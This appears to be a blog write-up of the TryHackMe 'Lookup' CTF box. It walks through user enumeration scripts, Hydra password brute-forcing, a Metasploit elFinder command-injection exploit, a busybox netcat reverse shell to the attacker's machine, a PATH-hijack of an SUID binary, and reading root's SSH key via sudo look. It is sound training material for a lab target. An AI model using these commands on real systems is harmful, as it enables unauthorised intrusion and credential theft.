---
title: 'TryHackMe: Lookup CTF Walkthrough'
author: 0xcrax
categories: [TryHackMe]
tags: [web, rustscan, hydra, feroxbuster, ffuf, DNS, Subdomain-Enumeration, searchsploit, msfconsole, RCE, command injection, ssh, strings, time, suid, sudo, strace, busybox, Spoof-Binary, PATH-Hijack]
render_with_liquid: true
img_path: /images/TryHackMe/Lookup
image:
  path: /images/TryHackMe/Lookup/room_image.webp
---

🧰 Writeup Overview

is a `Linux-based machine` that focuses on:

- Subdomain enumeration to uncover a hidden elFinder file manager
- Remote Code Execution (RCE) via a vulnerable PHP connector in elFinder
- Privilege escalation through a misconfigured `SUID binary` and abused PATH variable
- SSH brute-force using harvested credentials
- Root access using a `leaked private key` extracted with the `look GTFOBin`

The box challenges your skills in `enumeration`, `web exploitation`, `password attacks`, and `local privilege escalation`, and is ideal for learning real-world exploitation techniques.

<a href="https://tryhackme.com/r/room/lookup" target="_blank" class="box-button" data-mobile-text="Lookup CTF Challenge | TryHackMe" style="display: flex; width: 100%; max-width: 1000px; align-items: center; justify-content: center; background: linear-gradient(135deg, #2a0e0e 0%, #1a0505 100%); padding: 15px 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(255, 0, 0, 0.3); color: #ff4444; text-decoration: none; font-family: Arial, sans-serif; font-weight: bold; border: 1px solid #ff5555; margin: 10px auto; transition: all 0.3s ease;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 0 25px rgba(255, 0, 0, 0.7)'; this.style.color='#ffffff';" onmouseout="this.style.transform='translateY(0px)'; this.style.boxShadow='0 4px 15px rgba(255, 0, 0, 0.3)'; this.style.color='#ff4444';">
<span>Lookup CTF Challenge | TryHackMe</span>
<img src="/images/TryHackMe/THM.webp" alt="Icon" style="width: 48px; height: 48px; margin-right: 10px; filter: hue-rotate(300deg) brightness(0.9); transition: all 0.3s ease;" onmouseover="this.style.transform='scale(1.1)'; this.style.filter='hue-rotate(320deg) brightness(1.3)';" onmouseout="this.style.transform='scale(1)'; this.style.filter='hue-rotate(300deg) brightness(0.9)';">
</a>

## 🧾 Recon(Lookup)
Edit `/etc/hosts`
```sh
sudo nano /etc/hosts
```
Add:
```sh
10.10.158.59    lookup.thm
```
### Open Ports Found
RustScan (Initial Fast Port Scan)
```sh
rustscan -a lookup.thm -p 22,80,8000,8089,8191,33399,50000 -- -sCV -T4 -oN lookup.nmap
```

```sh
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
22 (OpenSSH 8.2p1 Ubuntu)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Login Page
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

### Web Enumeration
Directory Bruteforce
```sh
feroxbuster -u http://lookup.thm/ -w /usr/share/wordlists/dirb/big.txt -t 100 --filter-status 403,404 -x php
```
```
200      GET        1l        0w        1c http://lookup.thm/login.php
200      GET       50l       84w      687c http://lookup.thm/styles.css
200      GET       26l       50w      719c http://lookup.thm/
200      GET       26l       50w      719c http://lookup.thm/index.php
```
 

### Virtual Host(Subdomains) Enumeration
```sh
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt  \
-u http://targeted-ip -H "Host: FUZZ.lookup.thm" -fs 0
```

> We can use -fc == filter code OR -fs == filter size
{: .prompt-info }

```sh
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt  \         
-u http://targeted-ip -H "Host: FUZZ.lookup.thm" -fc 302
```

OR
```
gobuster vhost -u http://lookup.thm -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```
Unfortunately, it didn't appear due to lack of connection so that need Credential.


### User Enumeration

Extract users  based on server response
![](/images/TryHackMe/Lookup/req1.png)

![](/images/TryHackMe/Lookup/req2.png)

#### **option |**
```sh
ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -X POST \
-d "username=FUZZ&password=wrongpass" \
-u http://lookup.thm/login.php \
-H "Content-Type: application/x-www-form-urlencoded" \
-mr "Wrong password. Please try again"
```
result `admin`,`jose`
```sh

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://lookup.thm/login.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Usernames/Names/names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&password=wrongpass
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: Wrong password. Please try again
________________________________________________

admin                   [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 83ms]
jose                    [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 192ms]
```

#### **option ||**
with code python to do that
```py
import requests
from concurrent.futures import ThreadPoolExecutor
import threading

URL = "http://lookup.thm/login.php"
WORDLIST = "/usr/share/wordlists/seclists/Usernames/Names/names.txt"
THREADS = 100
MATCH_TEXT = "Wrong password"  # <-- Change this if your app says "Invalid password" or similar

lock = threading.Lock()

def check_username(username):
    username = username.strip()
    if not username:
        return

    data = {
        "username": username,
        "password": "wrongpass"
    }

    try:
        response = requests.post(URL, data=data, timeout=5)
        if MATCH_TEXT in response.text:
            with lock:
                print(username)
    except requests.RequestException:
        pass  # optionally print error

def main():
    with open(WORDLIST, "r") as file:
        usernames = [line.strip() for line in file if line.strip()]

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        executor.map(check_username, usernames)

if __name__ == "__main__":
    main()
```

```sh
time python3 Username_Enumeration
```
 that took approximately `149.21` seconds to complete.

```sh                                                                           
admin
jose

real    49.21s
user    22.57s
sys     12.81s
cpu     71%
```


#### **option |||**
```py
import aiohttp
import asyncio

TARGET = 'http://lookup.thm/login.php'
WORDLIST = "/usr/share/wordlists/seclists/Usernames/Names/names.txt"
valid_usernames = []

async def check_username(session, username):
    """Check if a username is valid by sending a POST request."""
    form_data = {'username': username.strip(), 'password': 'test'}
    try:
        async with session.post(TARGET, data=form_data) as response:
            response_text = await response.text()
            if 'Wrong username' not in response_text:
                valid_usernames.append(username.strip())
                print(f"[+] Found valid username: {username.strip()}")
    except Exception as e:
        print(f"[!] Error checking {username.strip()}: {e}")

async def main():
    """Read usernames from wordlist and check them asynchronously."""
    async with aiohttp.ClientSession() as session:
        try:
            with open(WORDLIST, 'r') as file:
                usernames = file.readlines()
                tasks = [check_username(session, uname) for uname in usernames]
                await asyncio.gather(*tasks)
        except FileNotFoundError:
            print(f"[!] Wordlist not found at: {WORDLIST}")
            return

    print("\n[+] Valid usernames found:", valid_usernames)

if __name__ == "__main__":
    asyncio.run(main())
```

```sh
time python3 Username_Enumeration.py
```

```sh
[+] Found valid username: admin
[+] Found valid username: jose

[+] Valid usernames found: ['admin', 'jose']

real	23.57s
user	4.72s
sys	    0.94s
cpu	    24%

```

## 🦿 Foothold

### Credential Brute Force
```sh
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password. Please try again" -V
```
jose is vaild Credential to log in `http:/lookup.thm` 

```sh
[80][http-post-form] host: lookup.thm   login: jose   password: **********
```

> If I add flags or other arguments after the methode (http-form-port), hydra didn’t do anything. To work, I had to let the command line end with the method used.
{: .prompt-tip }

![](/images/TryHackMe/Lookup/elfinder.png)

## 💀 Exploiting elFinder

Visit `http://files.lookup.thm` — elFinder web interface is visible.

Add it to `/etc/hosts`:
```sh
10.10.158.59    lookup.thm    files.lookup.thm
```

Search for Exploits
```sh
searchsploit elFinder
```

Metasploit Exploit

> Web Login Required Before Exploiting,
> You must log in as user `jose` at `http://lookup.thm/` to access the `files.lookup.thm` file manager over Uploading payload.
{: .prompt-warning }


```sh
msfconsole -q
search elFinder
use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
set RHOSTS files.lookup.thm
set LHOST tun0
run
```

Get shell access:
```sh
shell
id
```
```sh
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Finally, After gaining access through an elFinder RCE exploit, we obtain a limited shella `foothold` as a `www-data` user.


![](/images/TryHackMe/Lookup/foothold.png)

## 🏴‍☠️ User flag

### Stabilize Shell & Move Laterally

Setup Listener on Your `Local Machine`
```sh
nc -lvnp 3333
```
Then from target Machine(Shell Metasploit):
```sh
busybox nc <your_tun0> 3333 -e bash
```

![](/images/TryHackMe/Lookup/reverse-shell.png)

```sh
python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm-256color
cd /home/think
```

### Privilege Escalation Prep
Privilege Escalation Attempt (SUID Binaries):

```sh
find / -perm /4000 2>/dev/null
```
Found executable file `/usr/sbin/pwm`

```sh
/usr/sbin/pwm
```
Output:
```sh
/usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

```sh
strings /usr/sbin/pwm
```
✅ Key Observations from strings /usr/sbin/pwm
Let’s extract the important parts:
```sh
[!] Running 'id' command to extract the username and user ID (UID)
[-] Error executing id command
uid=%*u(%[^)])
[-] Error reading username from id command
[!] ID: %s
/home/%s/.passwords
[-] File /home/%s/.passwords not found
```
It runs the `id` command with:
```c
popen("id", "r")
```
It uses a `scanf`-like pattern:
```c
uid=%*u(%[^)])
```

```sh
strace -e trace=process /usr/sbin/pwm
```
What `strace` Reveals:
```sh
[!] Running 'id' command to extract the username and user ID (UID)
clone(...) = 3568
...
[!] ID: www-data
```
What does this mean?
The binary spawns a child process using `clone()` → that's how it runs the `id` command.

The output is parsed, and it detects the current user is `www-data`.

Then it looks for `/home/www-data/.passwords` but doesn't find it.

🔐 Key Insight
Since the binary uses `clone()` (which implies it uses `popen()` internally), and calls `id` without full path, you can trick it by making a `fake id binary` earlier in your `PATH`.

🔎 Explanation:
- It runs the `id` command to determine which user is executing the program.
- You are currently user `www-data`, so it tries to read `/home/www-data/.passwords`, But that file doesn't exist → hence the error.
- We need a trick in executable file `/usr/sbin/pwm` to make UID `think` the owner of the file `/home/www-data/.passwords` instead of UID `www-data` via `Spoof binary id command`, then we can read it.


`Spoof binary` using `PATH` hijack:

- Make a fake id binary
```sh
cd /tmp
echo '#!/bin/bash' > /tmp/id
echo "echo 'uid=33(think) gid=33(think) groups=33(think)'" >> /tmp/id
chmod +x id
```

- Hijack the PATH
```sh
export PATH=/tmp:$PATH
```

- Run the binary

now we can read it & Extracting Password Wordlist:
```sh
/usr/sbin/pwm
```

```sh
/usr/sbin/pwm > passwords
```

### Brute-force SSH using harvested passwords
```sh
python3 -m http.server 8080
```

```sh
# From attacker:
wget http://lookup.thm:8080/passwords

hydra -l think -P passwords -f lookup.thm ssh
```

```sh
ssh think@lookup.thm
```

```sh
think@ip-10-10-99-50:~$ id
uid=1000(think) gid=1000(think) groups=1000(think)
```

You now have user flag:
```sh
cat user.txt
```

## 🏴‍☠️ Root flag

### Privilege Escalation

```sh
sudo -l
```
Output:
```sh
(ALL) /usr/bin/look
```

**you can check into below :**

<a href="https://gtfobins.github.io/gtfobins/look/" target="_blank" class="box-button" data-mobile-text="LOOK | GTFOBins" style="display: flex; width: 100%; max-width: 1000px; align-items: center; justify-content: center; background: linear-gradient(135deg, #1a1a1a 100%, #1a1a1a 100%); padding: 15px 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4); color: #a1a1a1; text-decoration: none; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight: 600; border: 2px solid #404040; margin: 10px auto; transition: all 0.3s ease;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 0 20px rgba(255, 255, 255, 0.3)'; this.style.borderColor='#666';" onmouseout="this.style.transform='translateY(0px)'; this.style.boxShadow='0 4px 15px rgba(0, 0, 0, 0.4)'; this.style.borderColor='#404040';">
<span>LOOK | GTFOBins</span>
<img src="/images/TryHackMe/gtfobins.png" alt="Icon" style="width: 48px; height: 48px; margin-right: 10px; transition: all 0.3s ease; filter: brightness(0.8);" onmouseover="this.style.transform='scale(1.1)'; this.style.filter='brightness(1.2)';" onmouseout="this.style.transform='scale(1)'; this.style.filter='brightness(0.8)';">
</a>

```sh
sudo /usr/bin/look '' "/root/.ssh/id_rsa"
```

### Root Access via SSH Key
Save key to file:
```sh
gedit id_rsa
chmod 600 id_rsa
ssh -i id_rsa root@lookup.thm
```
> A key in PEM format like this one, has to have an empty line at the end.
{: .prompt-tip }

```sh
root@ip-10-10-99-50:~# id
uid=0(root) gid=0(root) groups=0(root)
```
Capture the Flag
```sh
cat root.txt
```

<div class="gif-container">
<img src="/gifs/labubu.gif" alt="GIF" class="gif-responsive">
</div>

---

<style>
img {
  transition: all 0.3s ease;
}

img:hover {
  transform: scale(1.05);
  filter: brightness(90%);
  box-shadow: 0 15px 35px rgba(0, 0, 0, 0);
}

img:center {
  display: block;
  margin-left: auto;
  margin-right: auto;
}

.wrap pre {
  white-space: pre-wrap;
}

.gif-container {
    text-align: center;
    margin: 30px 0;
}

.gif-responsive {
    width: 100%;
    max-width: 800px;
    height: 450px;
    border-radius: 12px;
    object-fit: cover;
    box-shadow: 0 10px 25px rgba(0, 0, 0, 0);
    transition: transform 0.3s ease, box-shadow 0.3s ease;
}

.gif-responsive:hover {
    transform: scale(1.02);
    box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
}

/* Additional video styles */
.video-container {
  text-align: center;
  margin: 30px auto;        /* centers inside post */
  max-width: 800px;         /* keeps container from being huge */
}

.video-responsive {
  width: 100%;              /* fill container */
  aspect-ratio: 16 / 9;    /* keeps correct proportions on desktop */
  border-radius: 12px;
  object-fit: cover;
  box-shadow: 0 10px 25px rgba(0.1, 0.1, 0, 0.1);
  transition: transform 0.3s ease, box-shadow 0.3s ease;
}

.video-responsive:hover {
  transform: scale(1.02);
  box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
}

/* Mobile Responsive Styles */
@media screen and (max-width: 768px) {
    .gif-responsive {
    width: 100% !important;
    max-width: 100% !important;
    height: auto !important;
  }

  .video-responsive {
    width: 100% !important;
    max-width: 100% !important;
    aspect-ratio: auto;  /* let phone use natural aspect ratio */
    height: auto !important;
  }
  
  .box-button {
    max-width: 100% !important;
    width: 100% !important;
    padding: 10px 14px !important;
    justify-content: center !important;
    gap: 6px !important;
    position: relative;
  }
  /* Hide desktop text on mobile */
  .box-button span {
    display: none !important;
  }

  /* Show mobile text from data attribute */
  .box-button::after {
    content: attr(data-mobile-text) !important;
    font-size: 10px !important;
    text-align: center !important;
    white-space: nowrap !important;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif !important;
    font-weight: 1000 !important;
  }

      /* DEFAULT: Use #a1a1a1 for most buttons */
    .box-button::after {
      color: #a1a1a1 !important;
    }

    /* Specific color overrides for each button style */
    
    /* CYBER BLUE NEON - Blue text */
    .box-button[style*="color: #00ccff"]::after,
    .box-button[style*="color:#00ccff"]::after {
      color: #00ccff !important;
    }

    /* HACKER GREEN TERMINAL - Green text */
    .box-button[style*="color: #00ff88"]::after,
    .box-button[style*="color:#00ff88"]::after {
      color: #00ff88 !important;
    }

    /* PURPLE NEON LIGHT - Purple text */
    .box-button[style*="color: #cc00ff"]::after,
    .box-button[style*="color:#cc00ff"]::after {
      color: #cc00ff !important;
    }

    /* RED ALERT GLOW - Red text (#ff4444) */
    .box-button[style*="color: #ff4444"]::after,
    .box-button[style*="color:#ff4444"]::after,
    .box-button[style*="color: #ff5555"]::after,
    .box-button[style*="color:#ff5555"]::after {
      color: #ff4444 !important;
    }

    /* ORANGE SUNLIGHT - Orange text */
    .box-button[style*="color: #ffaa00"]::after,
    .box-button[style*="color:#ffaa00"]::after {
      color: #ffaa00 !important;
    }

    /* MINIMAL LIGHT SHINE - Dark text for light background */
    .box-button[style*="background: #ffffff"]::after,
    .box-button[style*="background:#ffffff"]::after,
    .box-button[style*="color: #333333"]::after,
    .box-button[style*="color:#333333"]::after {
      color: #333333 !important;
    }

    /* TEAL CYBER GLOW - Teal text */
    .box-button[style*="color: #5eead4"]::after,
    .box-button[style*="color:#5eead4"]::after {
      color: #5eead4 !important;
    }

    /* PINK NEON LIGHT - Pink text */
    .box-button[style*="color: #f9a8d4"]::after,
    .box-button[style*="color:#f9a8d4"]::after {
      color: #f9a8d4 !important;
    }

    /* FOREST GREEN LIGHT - Lime text */
    .box-button[style*="color: #bef264"]::after,
    .box-button[style*="color:#bef264"]::after {
      color: #bef264 !important;
    }

    /* DARK RED WINE GLOW - Light red text */
    .box-button[style*="color: #fecaca"]::after,
    .box-button[style*="color:#fecaca"]::after {
      color: #fecaca !important;
    }

    /* LIGHT BLUE SKY SHINE - Blue text */
    .box-button[style*="color: #1e40af"]::after,
    .box-button[style*="color:#1e40af"]::after {
      color: #1e40af !important;
    }

    /* DARK ORANGE GLOW - Orange text */
    .box-button[style*="color: #fdba74"]::after,
    .box-button[style*="color:#fdba74"]::after {
      color: #fdba74 !important;
    }

    /* CYBER YELLOW - Yellow text */
    .box-button[style*="color: #fef08a"]::after,
    .box-button[style*="color:#fef08a"]::after {
      color: #fef08a !important;
    }

    /* DEEP SPACE - Purple text */
    .box-button[style*="color: #9370db"]::after,
    .box-button[style*="color:#9370db"]::after {
      color: #9370db !important;
    }

    /* ELECTRIC PINK - Pink text */
    .box-button[style*="color: #e879f9"]::after,
    .box-button[style*="color:#e879f9"]::after {
      color: #e879f9 !important;
    }

    /* LAVA RED - Light red text */
    .box-button[style*="color: #fca5a5"]::after,
    .box-button[style*="color:#fca5a5"]::after {
      color: #fca5a5 !important;
    }

    /* AQUA MARINE - Teal text */
    .box-button[style*="color: #99f6e4"]::after,
    .box-button[style*="color:#99f6e4"]::after {
      color: #99f6e4 !important;
    }

    /* ROYAL PURPLE - Light purple text */
    .box-button[style*="color: #d8b4fe"]::after,
    .box-button[style*="color:#d8b4fe"]::after {
      color: #d8b4fe !important;
    }

    /* EMERALD GREEN - Green text */
    .box-button[style*="color: #6ee7b7"]::after,
    .box-button[style*="color:#6ee7b7"]::after {
      color: #6ee7b7 !important;
    }

    /* MIDNIGHT BLUE - Light blue text */
    .box-button[style*="color: #93c5fd"]::after,
    .box-button[style*="color:#93c5fd"]::after {
      color: #93c5fd !important;
    }

    /* Light backgrounds with colored text - use original colors */
    .box-button[style*="background: linear-gradient(135deg, #fef3c7"]::after,
    .box-button[style*="background: linear-gradient(135deg, #fde68a"]::after,
    .box-button[style*="background: linear-gradient(135deg, #f8fafc"]::after,
    .box-button[style*="background: linear-gradient(135deg, #dbeafe"]::after,
    .box-button[style*="background: linear-gradient(135deg, #bfdbfe"]::after {
      color: #333333 !important; /* Dark text for better contrast on light backgrounds */
    }

  .box-button img {
    width: 28px !important;
    height: 28px !important;
    margin-right: 0 !important;
  }
}
/* Desktop Styles */
@media screen and (min-width: 769px) {
  .box-button::after {
    display: none !important;
  }
  
  .box-button span {
    display: inline !important;
  }
}
</style>
<script>
// Function to make only .redirect class links open in new tabs, but not work here actually i don'know why
document.querySelectorAll('a.redirect').forEach(link => {
    link.setAttribute('target', '_blank');
    link.setAttribute('rel', 'noopener noreferrer');
});
</script>
